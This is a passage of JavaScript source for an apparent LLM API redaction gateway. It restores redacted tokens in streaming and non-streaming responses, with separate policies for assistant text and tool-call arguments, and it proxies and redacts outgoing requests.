    this.holdback = streamHoldbackPrefixes(ctx, registry);
  }
  ingest(raw) {
    const parsed=parseSseEvent(raw);
    const payload=parsed.dataText;
    if (!payload || payload === "[DONE]") { this.queue.push({safe:true, output:raw+"\n\n"}); return this.drain(); }
    let data;
    try { data=JSON.parse(payload); } catch {
      // Unparseable event: treat it as prose rather than resolving tokens we cannot
      // attribute to a channel.
      const res=applySinkPolicy(payload,this.ctx,{kind:SINK_KIND.ASSISTANT_TEXT},this.trusted,this.registry);
      this.queue.push({safe:true, output:serializeSseEvent(parsed,res.text)}); return this.drain();
    }
    const fields=streamFields(data, parsed.eventName);
    const excluded=new Set(fields.map((f)=>f.path.join(".")));
    // Strings that are NOT delta channels are walked under the prose policy, not blindly.
    restoreCompleteStrings(data,this.ctx,excluded,[],this.trusted,this.registry);
    const ev={safe:fields.length===0,pending:fields.length,parsed,data,output:null};
    this.queue.push(ev);
    const affected=new Set();
    for (const f of fields) {
      const parent=getAt(data,f.path), key=f.path[f.path.length-1], source=parent[key];
      let ch=this.channels.get(f.channel);
      if (!ch) { ch={text:"",records:[],sink:f.sink || {kind:SINK_KIND.ASSISTANT_TEXT}}; this.channels.set(f.channel,ch); }
      if (f.sink?.toolName && !ch.sink.toolName) ch.sink.toolName = f.sink.toolName;
      ch.text += source; ch.records.push({ev,parent,key}); affected.add(f.channel);
    }
    for (const key of affected) this.maybeFlushChannel(key,false);
    return this.drain();
  }
  /**
   * Whether the channel tail could still grow into a protected string.
   *
   * Three cases, in increasing subtlety:
   *   1. the dialect shape (CRG) may yet complete;
   *   2. the tail is a PARTIAL prefix of a holdback string (`v Q1JH`);
   *   3. the tail ENDS WITH a complete declared prefix or exact token (`v ACME_`).
   *
   * Case 3 is why a pure prefix matcher is not enough: `v ACME_` has no partial prefix,
   * but whether the token continues is unknowable until the next chunk arrives. A
   * `streamPrefix` is declared precisely because tokens of that issuer do continue.
   */
  mustHoldBack(text) {
    if (possibleTokenSuffixLength(text) > 0) return true;
    const ambiguous = partialPrefixLength(text, this.holdback);
    if (ambiguous === 0) return false;
    // The tail is ambiguous, so it is held. There is deliberately no "the matcher is
    // satisfied, release it" shortcut.
    //
    // An earlier rule released as soon as a namespace matcher was satisfied, and that is a
    // different statement from "the token has ended": `ACME_[A-Z0-9_]{4,}` accepts
    // `ACME_ABCD`, so the first half of a split token was emitted and the client received
    // the token in two pieces. Whether an arbitrary pattern can still be extended is not
    // decidable in general, so a declared `streamPrefix` is read as "tokens of this issuer
    // continue until they stop arriving".
    //
    // The cost is bounded and explicit: a channel whose final content ends in an ambiguous
    // tail is released when the stream ends (SseRestorer.finish() forces the flush), never
    // silently dropped.
    return true;
  }

  maybeFlushChannel(key,force) {
    const ch=this.channels.get(key); if (!ch || !ch.records.length) return;

    // Hold back while the tail could still become a protected string, so a surrogate or a
    // registered foreign token split across deltas is reassembled rather than emitted in
    // pieces. Both the dialect shapes and the ledger/registry prefixes are considered.
    //
    // The channel's records are left UNCONSUMED while holding, so the next delta joins the
    // same accumulation and the whole run is emitted once, at the first event that
    // completes it. Consuming them here would leave the queued events permanently unsafe,
    // because each has already been queued and there is no second pass over the queue.
    if (!force && this.mustHoldBack(ch.text)) return;

    // The CHANNEL's sink decides, so a fragmented tool argument is never resolved
    // part-way through.
    const restored=applySinkPolicy(ch.text,this.ctx,ch.sink,this.trusted,this.registry).text;
    // The text lands on the FIRST record of the run and the rest are emptied, so
    // reassembled content is emitted exactly once.
    for (const r of ch.records) r.parent[r.key]="";
    const first=ch.records[0]; first.parent[first.key]=restored;
    for (const r of ch.records) { r.ev.pending--; if (r.ev.pending===0) r.ev.safe=true; }
    ch.text=""; ch.records=[];
  }
  finish() { for (const key of this.channels.keys()) this.maybeFlushChannel(key,true); return this.drain(true); }
  drain(force=false) {
    let out="";
    while (this.queue.length && (this.queue[0].safe || force)) {
      const ev=this.queue.shift();
      if (ev.output != null) out += ev.output;
      else if (ev.data !== undefined) out += serializeSseEvent(ev.parsed, JSON.stringify(ev.data));
      else out += ev.parsed?.raw ? ev.parsed.raw+"\n\n" : "";
    }
    return out;
  }
}

// ------------------------------------------- protocol-aware response routing --------
//
// The response is walked BY PROTOCOL so each string is delivered under the right sink,
// instead of restoreJson() recursing blindly and resolving every token it meets. A
// protocol adapter must not call restoreText() on its own: that is how the policy was
// bypassed before.

/** Route a tool-call argument list on one OpenAI message/delta object. */
function applyOpenAiToolCalls(toolCalls, ctx, trusted, registry = null) {
  if (!Array.isArray(toolCalls)) return;
  for (const call of toolCalls) {
    const fn = call?.function;
    if (!fn || typeof fn.arguments !== "string") continue;
    const res = applySinkPolicy(fn.arguments, ctx, { kind: SINK_KIND.TOOL_ARGUMENT, toolName: fn.name }, trusted, registry);
    fn.arguments = res.text;
  }
}

/** Route one OpenAI chat choice (message or streaming delta). */
function applyOpenAiChoice(choice, ctx, trusted, registry = null) {
  const node = choice?.message || choice?.delta;
  if (!node) return;
  if (typeof node.content === "string") {
    node.content = applySinkPolicy(node.content, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
  }
  applyOpenAiToolCalls(node.tool_calls, ctx, trusted, registry);
}

/** Route one Anthropic content block list (non-stream response body). */
function applyAnthropicContent(content, ctx, trusted, registry = null) {
  if (!Array.isArray(content)) return;
  for (const block of content) {
    if (!block || typeof block !== "object") continue;
    if (block.type === "text" && typeof block.text === "string") {
      block.text = applySinkPolicy(block.text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
    } else if (block.type === "tool_use" && Array.isArray(block.content)) {
      // Newer Anthropic tool results carry their payload as content blocks.
      applyAnthropicContent(block.content, ctx, trusted, registry);
    } else if (block.type === "tool_use" && block.input && typeof block.input === "object") {
      // Tool inputs are structured. EVERY string leaf is an operand, at any depth: a
      // one-level loop missed `{headers:{auth:"<token>"}}` and `{args:["<token>"]}`, so an
      // operand nested one level down was resolved like prose.
      applyOperandPolicy(block.input, ctx, trusted, registry, block.name);
    }
  }
}

/**
 * Apply the operand policy to every string leaf of a structured value, at any depth.
 * Objects and arrays are traversed; only strings are rewritten, and the tree is mutated in
 * place so the wire shape is preserved.
 */
export function applyOperandPolicy(value, ctx, trusted, registry, toolName = null) {
  if (typeof value === "string") {
    return applySinkPolicy(value, ctx, { kind: SINK_KIND.TOOL_ARGUMENT, toolName }, trusted, registry).text;
  }
  if (Array.isArray(value)) {
    for (let i = 0; i < value.length; i++) value[i] = applyOperandPolicy(value[i], ctx, trusted, registry, toolName);
    return value;
  }
  if (value && typeof value === "object") {
    for (const key of Object.keys(value)) {
      value[key] = applyOperandPolicy(value[key], ctx, trusted, registry, toolName);
    }
    return value;
  }
  return value;
}

/** Walk a parsed non-stream response and return it with the policy applied. */
export function applyResponsePolicy(data, ctx, trusted = null, registry = null) {
  if (!data || typeof data !== "object") return data;
  if (Array.isArray(data.choices)) {
    for (const choice of data.choices) applyOpenAiChoice(choice, ctx, trusted, registry);
  }
  if (Array.isArray(data.content)) applyAnthropicContent(data.content, ctx, trusted, registry);
  // OpenAI Responses API. `output_text` is the aggregate assistant text, so it restores
  // like prose; the text parts and function_call arguments are handled separately below.
  if (typeof data.output_text === "string") {
    data.output_text = applySinkPolicy(data.output_text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
  }
  if (Array.isArray(data.output)) {
    for (const item of data.output) {
      if (item?.type === "function_call" && typeof item.arguments === "string") {
        item.arguments = applySinkPolicy(
          item.arguments, ctx,
          { kind: SINK_KIND.TOOL_ARGUMENT, toolName: item.name },
          trusted, registry
        ).text;
      }
      if (Array.isArray(item?.content)) {
        for (const part of item.content) {
          if (part && typeof part.text === "string") {
            part.text = applySinkPolicy(part.text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
          }
        }
      }
    }
  }
  return data;
}

export function restoreSseStream(body, ctx, trusted = null, registry = null) {
  const reader=body.getReader();
  const decoder=new TextDecoder();
  const encoder=new TextEncoder();
  const restorer=new SseRestorer(ctx, trusted, registry);
  let buffer="";
  let upstreamDone=false;
  let restorerFinished=false;

  function normalize() { buffer=buffer.replace(/\r\n/g,"\n"); }

  return new ReadableStream({
    async pull(controller) {
      try {
        while (true) {
          const idx=buffer.indexOf("\n\n");
          if (idx >= 0) {
            const raw=buffer.slice(0,idx);
            buffer=buffer.slice(idx+2);
            const produced=restorer.ingest(raw);
            if (produced) { controller.enqueue(encoder.encode(produced)); return; }
            continue;
          }

          if (upstreamDone) {
            if (buffer.length) {
              const raw=buffer; buffer="";
              const produced=restorer.ingest(raw);
              if (produced) { controller.enqueue(encoder.encode(produced)); return; }
              continue;
            }
            if (!restorerFinished) {
              restorerFinished=true;
              const final=restorer.finish();
              if (final) { controller.enqueue(encoder.encode(final)); return; }
            }
            controller.close();
            return;
          }

          const {done,value}=await reader.read();
          if (done) {
            buffer += decoder.decode();
            normalize();
            upstreamDone=true;
          } else {
            buffer += decoder.decode(value,{stream:true});
            normalize();
          }
        }
      } catch (e) {
        controller.error(e);
        try { await reader.cancel(e); } catch {}
      }
    },
    async cancel(reason) { try { await reader.cancel(reason); } catch {} }
  });
}

async function restoreNonStreamResponse(upstreamResponse, ctx, corsOrigin, trusted = null, registry = null) {
  const headers=withCors(upstreamResponse.headers,corsOrigin); headers.delete("content-encoding");
  if (!upstreamResponse.body || upstreamResponse.status===204 || upstreamResponse.status===304) return new Response(null,{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers});
  const ct=headers.get("content-type") || "";
  if (!isTextualContentType(ct)) return new Response(upstreamResponse.body,{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers});
  const text=await upstreamResponse.text();
  let out=text;
  if (isJsonContentType(ct)) {
    try {
      const data=JSON.parse(text);
      // Protocol-aware: every string is delivered under the sink it belongs to, so a
      // tool-call operand is not silently substituted.
      applyResponsePolicy(data, ctx, trusted, registry);
      out=JSON.stringify(data);
    } catch {
      // Not JSON we can walk: treat the whole body as inert text rather than resolving
      // tokens we cannot attribute to a channel.
      out=applySinkPolicy(text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
    }
  } else out=applySinkPolicy(text, ctx, { kind: SINK_KIND.ASSISTANT_TEXT }, trusted, registry).text;
  return new Response(out,{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers});
}

export async function handleRequest(request, env = {}, options = {}) {
  const corsOrigin=env?.REDACT_CORS_ORIGIN || "*";
  if (request.method === "OPTIONS") return corsPreflight(request,corsOrigin);
  const url=new URL(request.url);
  if (url.pathname === "/" || url.pathname === "/healthz") {
    return new Response(JSON.stringify({ok:true,service:"cosy-redact-gateway",route:"/<flags>$<upstream-url>",flags:ALL_FLAG_LETTERS,defaultAll:true}),{headers:withCors({"content-type":"application/json; charset=utf-8"},corsOrigin)});
  }
  let target;
  try { target=parseProxyTarget(request.url); } catch(e) { return jsonError(400,e.message); }
  if (!target) return jsonError(404,"Expected /<flags>$<upstream-url>");
  if (!allowedHost(target.upstream,env)) return jsonError(403,"Upstream host is not in REDACT_ALLOWED_HOSTS");

  // Sinks that handle secrets locally. A tool the model can call is NOT trusted merely
  // because it exists, so this has to be declared explicitly.
  // Foreign namespace ownership has to reach the DELIVERY policy, not just the unit tests:
  // G0 left it accepted-but-unused, so the three-way split was unreachable in production.
  const foreignRegistry = options.foreignRegistry || null;
  const trustedSinks = options.trustedSinks
    || (env?.REDACT_TRUSTED_BROKERS ? String(env.REDACT_TRUSTED_BROKERS).split(",").map((x) => x.trim()).filter(Boolean) : null);
  const maxBody=intSetting(env?.REDACT_MAX_BODY_BYTES,DEFAULT_MAX_BODY_BYTES);
  const maxRedactions=intSetting(env?.REDACT_MAX_REDACTIONS,DEFAULT_MAX_REDACTIONS);
  const ctx=new RedactionContext({salt:options.salt || RUNTIME_SALT,maxRedactions});
  const headers=filteredRequestHeaders(request.headers);
  let body;
  if (request.method !== "GET" && request.method !== "HEAD") {
    const bytes=await request.arrayBuffer();
    if (bytes.byteLength > maxBody) return jsonError(413,`Request body exceeds ${maxBody} bytes`);
    const ct=request.headers.get("content-type") || "";
    if (bytes.byteLength && !isJsonContentType(ct)) return jsonError(415,"For safety, request bodies must be JSON so they can be redacted before forwarding");
    if (bytes.byteLength) {
      let data;
      try { data=JSON.parse(new TextDecoder().decode(bytes)); } catch { return jsonError(400,"Invalid JSON request body"); }
      try {
        data=await redactJson(data,ctx,target.flags);
        const protocol=detectProtocol(data,target.upstream,request.headers);
        injectRedactNotice(data,protocol);
      } catch(e) { if (e instanceof RedactionLimitError) return jsonError(413,e.message); throw e; }
      body=JSON.stringify(data); headers.set("content-type","application/json"); headers.delete("content-length");
    } else body="";
  }

  const fetchImpl=options.fetchImpl || fetch;
  let upstreamResponse;
  try { upstreamResponse=await fetchImpl(target.upstream.toString(),{method:request.method,headers,body,redirect:"manual"}); }
  catch(e) { return jsonError(502,`Upstream fetch failed: ${e?.message || e}`); }

  const responseCt=upstreamResponse.headers.get("content-type") || "";
  if (/text\/event-stream/i.test(responseCt) && upstreamResponse.body) {
    const rh=withCors(upstreamResponse.headers,corsOrigin); rh.delete("content-length"); rh.delete("content-encoding");
    return new Response(restoreSseStream(upstreamResponse.body,ctx,trustedSinks,foreignRegistry),{status:upstreamResponse.status,statusText:upstreamResponse.statusText,headers:rh});
  }
  return restoreNonStreamResponse(upstreamResponse,ctx,corsOrigin,trustedSinks,foreignRegistry);
}

export default { fetch(request, env, ctx) { return handleRequest(request,env); } };

// Same file can be executed directly by Deno Deploy / `deno run --allow-net worker.js`.
if (typeof Deno !== "undefined" && import.meta.main) Deno.serve((request) => {
  let env = {};
  try { env = Deno.env.toObject(); } catch {}
  return handleRequest(request, env);
});
